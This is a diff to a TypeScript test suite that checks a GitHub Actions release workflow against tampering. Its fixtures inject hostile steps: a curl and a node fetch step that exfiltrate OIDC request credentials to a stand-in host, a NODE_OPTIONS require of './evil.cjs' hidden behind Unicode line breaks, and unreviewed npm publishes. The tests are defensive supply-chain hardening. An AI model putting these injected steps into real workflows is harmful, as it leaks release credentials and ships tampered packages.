@@ -69,6 +69,7 @@ type MutableReleaseConfig = Omit<
   packages: string[];
   publicationCandidate: {
     artifactSet: string;
+    environment: string;
     job: string;
     securityReviewIssue: string;
     workflow: string;
@@ -196,6 +197,24 @@ function createReleaseFixture(): string {
   return fixture;
 }
 
+function updateReleaseWorkflow(
+  fixture: string,
+  search: string,
+  replacement: string,
+): void {
+  const workflowPath = resolve(fixture, '.github/workflows/release.yml');
+  const workflow = readFileSync(workflowPath, 'utf8');
+  expect(workflow).toContain(search);
+  writeFileSync(workflowPath, workflow.replace(search, replacement));
+}
+
+function appendPublishWorkflowStep(fixture: string, step: string): void {
+  const workflowPath = resolve(fixture, '.github/workflows/release.yml');
+  const workflow = readFileSync(workflowPath, 'utf8');
+  expect(workflow).toContain('\n  publish:\n');
+  writeFileSync(workflowPath, `${workflow.trimEnd()}\n${step}\n`);
+}
+
 function updateJson<T extends object>(path: string, update: (value: T) => void): void {
   const value = JSON.parse(readFileSync(path, 'utf8')) as T;
   update(value);
@@ -319,18 +338,19 @@ describe('release readiness contract', () => {
       'needs: [preflight, repository-verification]',
     );
     expect(workflow).toContain("if: inputs.mode == 'verify'");
-    expect(
-      workflow.slice(
-        candidateJobIndex,
-        workflow.indexOf('\n  publish:\n'),
-      ),
-    ).not.toContain('id-token: write');
+    const candidateJob = workflow.slice(
+      candidateJobIndex,
+      workflow.indexOf('\n  publish:\n'),
+    );
+    expect(candidateJob).toContain('id-token: write');
+    expect(candidateJob).toContain('attestations: write');
     expect(publishJob).toContain(
       'name: Resolve exact publication authorization',
     );
     expect(publishJob).toContain(
       'name: Verify exact reviewed publication bytes',
     );
+    expect(publishJob).toContain('attestations: read');
     expect(publishJob).not.toContain('name: Install dependencies');
     expect(publishJob).not.toContain('pnpm pack');
   });
@@ -353,6 +373,7 @@ describe('release readiness contract', () => {
     });
     expect(config.publicationCandidate).toEqual({
       artifactSet: 'publication-candidate',
+      environment: 'publication-candidate',
       securityReviewIssue: 'OpenCoven/sdk#40',
       workflow: '.github/workflows/release.yml',
       job: 'publication-candidate',
@@ -657,7 +678,7 @@ describe('release readiness contract', () => {
   });
 
   test('requires the canonical native conformance platform matrix', () => {
-    expect(readReleaseConfig(workspaceRoot).schemaVersion).toBe(4);
+    expect(readReleaseConfig(workspaceRoot).schemaVersion).toBe(5);
     expect(readReleaseConfig(workspaceRoot).nativeConformancePlatforms).toEqual(
       SUPPORTED_PLATFORMS,
     );
@@ -900,6 +921,16 @@ describe('release readiness contract', () => {
     );
   });
 
+  test('grants the publish job read-only deployment verification access', () => {
+    const workflow = readFileSync(
+      resolve(workspaceRoot, '.github/workflows/release.yml'),
+      'utf8',
+    );
+    const publishJob = workflow.slice(workflow.indexOf('\n  publish:\n'));
+
+    expect(publishJob).toContain('      deployments: read');
+  });
+
   test('allows exactly one publication artifact upload in the candidate job', () => {
     const fixture = createReleaseFixture();
     const workflowPath = resolve(fixture, '.github/workflows/release.yml');
@@ -912,7 +943,673 @@ describe('release readiness contract', () => {
     );
 
     expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
-      'Release workflow must contain exactly one publication candidate upload',
+      'Release workflow candidate upload must be active and unconditional',
+    );
+  });
+
+  test('rejects a disabled candidate upload substituted by a sibling local action', () => {
+    const fixture = createReleaseFixture();
+    const actionRoot = resolve(
+      fixture,
+      '.github/actions/upload-publication-candidate',
+    );
+    mkdirSync(actionRoot, { recursive: true });
+    writeFileSync(
+      resolve(actionRoot, 'action.yml'),
+      [
+        'name: Upload publication candidate',
+        'runs:',
+        '  using: composite',
+        '  steps:',
+        '    - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
+        '      with:',
+        '        name: opencoven-sdk-publication-${{ github.sha }}-${{ inputs.version }}',
+        '        path: .artifacts/publication',
+        '',
+      ].join('\n'),
+    );
+    updateReleaseWorkflow(
+      fixture,
+      '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
+      [
+        '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
+        '        if: false',
+        '',
+      ].join('\n'),
+    );
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        run: corepack pnpm@10.34.0 verify:repository',
+        '      - name: Substitute publication candidate upload',
+        '        uses: ./.github/actions/upload-publication-candidate',
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow candidate upload must be active and unconditional',
+    );
+  });
+
+  test.each([
+    [
+      'GitHub CLI artifact API',
+      [
+        '      - name: Substitute publication candidate upload',
+        '        run: >-',
+        '          gh api --method POST',
+        '          repos/OpenCoven/sdk/actions/artifacts',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'curl artifact API',
+      [
+        '      - name: Substitute publication candidate upload',
+        '        run: |',
+        '          curl --fail-with-body --request POST \\',
+        '            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/artifacts"',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'secondary Node uploader',
+      [
+        '      - name: Substitute publication candidate upload',
+        '        run: node ./.github/scripts/upload-publication-candidate.mjs',
+        '',
+      ].join('\n'),
+    ],
+  ])('rejects disabled candidate upload substitution through %s', (_label, step) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
+      [
+        '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
+        '        if: false',
+        '',
+      ].join('\n'),
+    );
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        run: corepack pnpm@10.34.0 verify:repository',
+        step,
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow candidate upload must be active and unconditional',
+    );
+  });
+
+  test.each([
+    'false',
+    '${{ github.run_attempt == 1 }}',
+  ])('rejects candidate upload condition %s', (condition) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
+      [
+        '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
+        `        if: ${condition}`,
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow candidate upload must be active and unconditional',
+    );
+  });
+
+  test('rejects an additional sibling local action while the canonical upload remains active', () => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        run: corepack pnpm@10.34.0 verify:repository',
+        '      - name: Upload a sibling publication candidate',
+        '        uses: ./.github/actions/upload-publication-candidate',
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must use the exact frozen release job and step graph',
+    );
+  });
+
+  test.each([
+    [
+      'GitHub CLI',
+      '      - run: gh api repos/OpenCoven/sdk/actions/runs/1/artifacts\n',
+    ],
+    [
+      'curl',
+      [
+        '      - run: |',
+        '          curl --fail-with-body \\',
+        '            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/artifacts"',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'secondary Node script',
+      '      - run: node ./.github/scripts/upload-publication-candidate.mjs\n',
+    ],
+  ])('rejects an additional sibling artifact uploader through %s', (_label, step) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        run: corepack pnpm@10.34.0 verify:repository',
+        step,
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must use the exact frozen release job and step graph',
+    );
+  });
+
+  test.each([
+    'false',
+    '${{ inputs.mode == \'verify\' && github.run_attempt == 1 }}',
+  ])('rejects candidate creation condition %s', (condition) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Create immutable publication candidate\n',
+      [
+        '      - name: Create immutable publication candidate',
+        `        if: ${condition}`,
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow candidate creation must be active and unconditional',
+    );
+  });
+
+  test('rejects candidate upload before candidate creation and verification', () => {
+    const fixture = createReleaseFixture();
+    const createStep = [
+      '      - name: Create immutable publication candidate',
+      '        env:',
+      '          GH_TOKEN: ${{ github.token }}',
+      '        run: >-',
+      '          node ./scripts/create-release-artifacts.mjs',
+      '          --output .artifacts/publication',
+      '          --version "$RELEASE_VERSION"',
+      '',
+    ].join('\n');
+    const uploadStep = [
+      '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
+      '        with:',
+      '          name: opencoven-sdk-publication-${{ github.sha }}-${{ inputs.version }}',
+      '          path: .artifacts/publication',
+      '          if-no-files-found: error',
+      '          retention-days: 30',
+      '',
+    ].join('\n');
+    updateReleaseWorkflow(
+      fixture,
+      `${createStep}${uploadStep}`,
+      `${uploadStep}${createStep}`,
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow candidate steps must use the exact reviewed order',
+    );
+  });
+
+  test('rejects extra publication candidate artifact-name occurrences', () => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        env:',
+        '          SUBSTITUTE_NAME: opencoven-sdk-publication-${{ github.sha }}-${{ inputs.version }}',
+        '        run: corepack pnpm@10.34.0 verify:repository',
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must contain only the reviewed publication candidate artifact-name bindings',
+    );
+  });
+
+  test('uploads and attests candidate bytes only in the candidate-producing job', () => {
+    const workflow = readFileSync(
+      resolve(workspaceRoot, '.github/workflows/release.yml'),
+      'utf8',
+    );
+    const candidateStart = workflow.indexOf('\n  publication-candidate:\n');
+    const publishStart = workflow.indexOf('\n  publish:\n');
+    const candidateJob = workflow.slice(candidateStart, publishStart);
+    const publishJob = workflow.slice(publishStart);
+    const createIndex = candidateJob.indexOf(
+      'name: Create immutable publication candidate',
+    );
+    const uploadIndex = candidateJob.indexOf('uses: actions/upload-artifact@');
+    const attestationIndex = candidateJob.indexOf(
+      'uses: actions/attest-build-provenance@',
+    );
+
+    expect(createIndex).toBeGreaterThan(-1);
+    expect(uploadIndex).toBeGreaterThan(createIndex);
+    expect(attestationIndex).toBeGreaterThan(uploadIndex);
+    expect(candidateJob).toContain('    environment: publication-candidate');
+    expect(publishJob).not.toContain('actions/attest-build-provenance@');
+  });
+
+  test.each([
+    [
+      'anchor',
+      '    runs-on: ubuntu-latest\n',
+      '    runs-on: &release-runner ubuntu-latest\n',
+    ],
+    [
+      'alias',
+      '    runs-on: ubuntu-latest\n',
+      [
+        '    x-runner: &release-runner ubuntu-latest',
+        '    runs-on: *release-runner',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'merge key',
+      '    runs-on: ubuntu-latest\n',
+      [
+        '    x-runner: &release-runner',
+        '      runs-on: ubuntu-latest',
+        '    <<: *release-runner',
+        '    runs-on: ubuntu-latest',
+        '',
+      ].join('\n'),
+    ],
+  ])('rejects YAML %s graph indirection', (_label, search, replacement) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(fixture, search, replacement);
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must not use YAML anchors, aliases, or merge keys',
+    );
+  });
+
+  test.each([
+    ['bare carriage return', '\r'],
+    ['next-line separator', '\u0085'],
+    ['Unicode line separator', '\u2028'],
+    ['Unicode paragraph separator', '\u2029'],
+  ])('rejects %s as a hidden YAML line break', (_label, lineBreak) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n',
+      [
+        '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
+        '        env:',
+        '          NODE_OPTIONS: --require ./evil.cjs',
+      ].join(lineBreak) + '\n        with:\n',
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must use LF or CRLF line endings only',
+    );
+  });
+
+  test.each([
+    ['candidate', '    environment: publication-candidate'],
+    ['publish', '    environment: npm-release'],
+  ])('rejects Unicode whitespace in the %s environment name', (
+    _label,
+    environmentLine,
+  ) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      `${environmentLine}\n`,
+      `${environmentLine}\u00a0\n`,
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must contain ASCII text only',
+    );
+  });
+
+  test.each([
+    [
+      'multiline artifact API shell',
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        run: |',
+        '          corepack pnpm@10.34.0 verify:repository',
+        '          gh api repos/OpenCoven/sdk/actions/runs/1/artifacts',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'local composite action',
+      '      - uses: pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86 # v6.0.10\n',
+      '      - uses: ./.github/actions/setup-and-upload\n',
+    ],
+    [
+      'dynamic action expression',
+      '      - uses: pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86 # v6.0.10\n',
+      '      - uses: ${{ vars.RELEASE_SETUP_ACTION }}\n',
+    ],
+    [
+      'reusable workflow key',
+      '    runs-on: ubuntu-latest\n',
+      [
+        '    uses: ./.github/workflows/reusable-release.yml',
+        '    runs-on: ubuntu-latest',
+        '',
+      ].join('\n'),
+    ],
+  ])('rejects %s while preserving the visible step count', (
+    _label,
+    search,
+    replacement,
+  ) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(fixture, search, replacement);
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must use the exact frozen release job and step graph',
+    );
+  });
+
+  test('rejects an appended npm publish step in the OIDC-bearing publish job', () => {
+    const fixture = createReleaseFixture();
+    appendPublishWorkflowStep(
+      fixture,
+      [
+        '      - name: Publish unreviewed bytes',
+        '        run: npm publish ./unreviewed.tgz --provenance',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publish job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test.each([
+    [
+      'curl',
+      [
+        '      - name: Exfiltrate OIDC request credentials',
+        '        run: |',
+        '          curl --fail-with-body \\',
+        '            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \\',
+        '            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://capture.example.invalid"',
+      ].join('\n'),
+    ],
+    [
+      'secondary Node script',
+      [
+        '      - name: Exfiltrate OIDC request credentials',
+        '        run: >-',
+        '          node -e',
+        '          \'fetch(process.env.ACTIONS_ID_TOKEN_REQUEST_URL,',
+        '          {headers:{authorization:`Bearer ${process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}`}})\'',
+      ].join('\n'),
+    ],
+  ])('rejects appended OIDC token exfiltration through %s', (_label, step) => {
+    const fixture = createReleaseFixture();
+    appendPublishWorkflowStep(fixture, step);
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publish job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test.each([
+    [
+      'secondary artifact download',
+      [
+        '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c',
+        '        with:',
+        '          name: unrelated',
+        '          path: .artifacts/unrelated',
+      ].join('\n'),
+    ],
+    [
+      'local action',
+      [
+        '      - name: Local publisher',
+        '        uses: ./.github/actions/publish',
+      ].join('\n'),
+    ],
+    [
+      'secondary Node publisher',
+      [
+        '      - name: Secondary publisher',
+        '        run: node ./scripts/secondary-publish.mjs',
+      ].join('\n'),
+    ],
+    [
+      'GitHub CLI command',
+      [
+        '      - name: Request another artifact',
+        '        run: gh run download 10000 --name unrelated',
+      ].join('\n'),
+    ],
+    [
+      'conditional shell step',
+      [
+        '      - name: Conditional publisher',
+        '        if: ${{ github.run_attempt == 1 }}',
+        '        run: npm publish ./unreviewed.tgz',
+      ].join('\n'),
+    ],
+  ])('rejects extra publish execution through %s', (_label, step) => {
+    const fixture = createReleaseFixture();
+    appendPublishWorkflowStep(fixture, step);
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publish job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test('rejects conditionally disabled reviewed publish steps', () => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '      - name: Publish exact reviewed release artifacts\n',
+      [
+        '      - name: Publish exact reviewed release artifacts',
+        '        if: false',
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publish job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test('rejects reordered authorization and artifact download steps', () => {
+    const fixture = createReleaseFixture();
+    const authorizationStep = [
+      '      - name: Resolve exact publication authorization',
+      '        id: authorization',
+      '        env:',
+      '          GH_TOKEN: ${{ github.token }}',
+      '        run: >-',
+      '          node ./scripts/github-release-authorization.mjs',
+      '          --github-output "$GITHUB_OUTPUT"',
+      '',
+    ].join('\n');
+    const downloadStep = [
+      '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1',
+      '        with:',
+      '          name: ${{ steps.authorization.outputs.artifact-name }}',
+      '          path: .artifacts/publication',
+      '          github-token: ${{ github.token }}',
+      '          repository: OpenCoven/sdk',
+      '          run-id: ${{ steps.authorization.outputs.run-id }}',
+      '',
+    ].join('\n');
+    updateReleaseWorkflow(
+      fixture,
+      `${authorizationStep}${downloadStep}`,
+      `${downloadStep}${authorizationStep}`,
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publish job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test('rejects extra commands inside the reviewed sterile publisher step', () => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      '          node ./scripts/publish-release-artifacts.mjs\n          --artifact-root .artifacts/publication\n',
+      [
+        '          node ./scripts/secondary-publish.mjs &&',
+        '          node ./scripts/publish-release-artifacts.mjs',
+        '          --artifact-root .artifacts/publication',
+        '',
+      ].join('\n'),
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publish job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test.each([
+    [
+      'candidate creation command',
+      '          node ./scripts/create-release-artifacts.mjs\n          --output .artifacts/publication\n',
+      [
+        '          node ./scripts/secondary-uploader.mjs &&',
+        '          node ./scripts/create-release-artifacts.mjs',
+        '          --output .artifacts/publication',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'candidate upload path',
+      '          path: .artifacts/publication\n          if-no-files-found: error\n',
+      [
+        '          path: .artifacts/substituted-publication',
+        '          if-no-files-found: error',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'candidate attestation subjects',
+      '            .artifacts/publication/tarballs/**/*.tgz\n',
+      '            .artifacts/publication/substituted/**/*.tgz\n',
+    ],
+  ])('rejects substituted %s with the same candidate step count', (
+    _label,
+    search,
+    replacement,
+  ) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(fixture, search, replacement);
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow publication-candidate job must use only the exact reviewed ordered steps',
+    );
+  });
+
+  test.each([
+    [
+      'preflight shell',
+      '          echo "Releases must run from main." >&2\n          exit 1\n',
+      [
+        '          node ./scripts/secondary-release-check.mjs',
+        '          echo "Releases must run from main." >&2',
+        '          exit 1',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'repository verification shell',
+      '      - name: Verify repository\n        run: corepack pnpm@10.34.0 verify:repository\n',
+      [
+        '      - name: Verify repository',
+        '        run: >-',
+        '          node ./scripts/secondary-release-check.mjs &&',
+        '          corepack pnpm@10.34.0 verify:repository',
+        '',
+      ].join('\n'),
+    ],
+    [
+      'repository job container',
+      '  repository-verification:\n    runs-on: ubuntu-latest\n',
+      [
+        '  repository-verification:',
+        '    runs-on: ubuntu-latest',
+        '    container: ghcr.io/example/unreviewed:latest',
+        '',
+      ].join('\n'),
+    ],
+  ])('rejects substituted %s in the frozen verification jobs', (
+    _label,
+    search,
+    replacement,
+  ) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(fixture, search, replacement);
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must use the exact frozen release job and step graph',
+    );
+  });
+
+  test.each([
+    [
+      'workflow_call',
+      [
+        '  workflow_call:',
+        '    inputs:',
+        '      mode:',
+        '        required: true',
+        '        type: string',
+      ].join('\n'),
+    ],
+    [
+      'push',
+      [
+        '  push:',
+        '    branches: [main]',
+      ].join('\n'),
+    ],
+  ])('rejects the additional %s release entry point', (_label, trigger) => {
+    const fixture = createReleaseFixture();
+    updateReleaseWorkflow(
+      fixture,
+      'on:\n  workflow_dispatch:\n',
+      `on:\n${trigger}\n  workflow_dispatch:\n`,
+    );
+
+    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
+      'Release workflow must use only the exact reviewed dispatch controls',
     );
   });
 
